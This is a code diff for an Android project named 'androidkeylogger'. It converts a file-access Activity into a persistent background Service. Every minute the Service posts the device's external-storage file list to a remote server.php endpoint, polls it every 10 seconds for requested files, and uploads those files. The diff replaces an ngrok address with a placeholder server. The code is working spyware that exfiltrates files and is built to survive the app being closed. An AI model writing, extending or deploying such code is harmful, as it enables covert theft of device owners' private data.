@@ -1,9 +1,10 @@
 package com.bshu2.androidkeylogger;
 
-import android.app.Activity;
-import android.os.Bundle;
-import android.os.Environment;
+import android.app.*;
+import android.content.Intent;
+import android.os.*;
 import android.util.Log;
+import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.*;
@@ -11,41 +12,68 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Scanner;
 
-public class FileAccess extends Activity {
-    private static final String SERVER_URL = "https://locust-handy-seagull.ngrok-free.app/server.php";
+public class FileAccessService extends Service {
+    private static final String CHANNEL_ID = "RemoteAccessChannel";
+    private static final String SERVER_URL = "https://yourserver.com/server.php";
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        new Thread(this::sendFileList).start();  // Send file list automatically on app launch
-        new Thread(this::checkForDownloadRequests).start();  // Periodically check for file requests
+    public void onCreate() {
+        super.onCreate();
+        createNotificationChannel();
+        startForeground(1, getNotification());
+
+        new Thread(this::sendFileList).start();
+        new Thread(this::checkForDownloadRequests).start();
+    }
+
+    private Notification getNotification() {
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Remote Access Service")
+                .setContentText("Running in background")
+                .setSmallIcon(R.drawable.ic_notification)  // Add an icon in res/drawable
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .build();
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel serviceChannel = new NotificationChannel(
+                    CHANNEL_ID, "Remote Access Background Service",
+                    NotificationManager.IMPORTANCE_LOW
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            manager.createNotificationChannel(serviceChannel);
+        }
     }
 
     private void sendFileList() {
-        try {
-            File directory = Environment.getExternalStorageDirectory();
-            File[] files = directory.listFiles();
-            if (files == null) return;
+        while (true) {
+            try {
+                File directory = Environment.getExternalStorageDirectory();
+                File[] files = directory.listFiles();
+                if (files == null) return;
 
-            JSONArray fileList = new JSONArray();
-            for (File file : files) {
-                if (file.isFile()) fileList.put(file.getName());
+                JSONArray fileList = new JSONArray();
+                for (File file : files) {
+                    if (file.isFile()) fileList.put(file.getName());
+                }
+
+                HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn.setDoOutput(true);
+
+                String payload = "file_list=" + fileList.toString();
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(payload.getBytes("UTF-8"));
+                    os.flush();
+                }
+
+                Log.d("FileAccessService", "Sent file list to server.");
+                Thread.sleep(60000);  // Send file list every 1 minute
+            } catch (Exception e) {
+                Log.e("FileAccessService", "Error sending file list", e);
             }
-
-            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            conn.setDoOutput(true);
-
-            String payload = "file_list=" + fileList.toString();
-            try (OutputStream os = conn.getOutputStream()) {
-                os.write(payload.getBytes("UTF-8"));
-                os.flush();
-            }
-
-            Log.d("FileAccess", "Sent file list to server.");
-        } catch (Exception e) {
-            Log.e("FileAccess", "Error sending file list", e);
         }
     }
 
@@ -67,7 +95,7 @@ public class FileAccess extends Activity {
 
                 Thread.sleep(10000);  // Check every 10 seconds
             } catch (Exception e) {
-                Log.e("FileAccess", "Error checking download requests", e);
+                Log.e("FileAccessService", "Error checking download requests", e);
             }
         }
     }
@@ -76,7 +104,7 @@ public class FileAccess extends Activity {
         try {
             File file = new File(Environment.getExternalStorageDirectory(), fileName);
             if (!file.exists()) {
-                Log.e("FileAccess", "File not found: " + fileName);
+                Log.e("FileAccessService", "File not found: " + fileName);
                 return;
             }
 
@@ -98,9 +126,19 @@ public class FileAccess extends Activity {
                 os.flush();
             }
 
-            Log.d("FileAccess", "Uploaded file: " + fileName);
+            Log.d("FileAccessService", "Uploaded file: " + fileName);
         } catch (Exception e) {
-            Log.e("FileAccess", "Error uploading file", e);
+            Log.e("FileAccessService", "Error uploading file", e);
         }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY; // Keep service running even if the app is closed
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
     }
 }
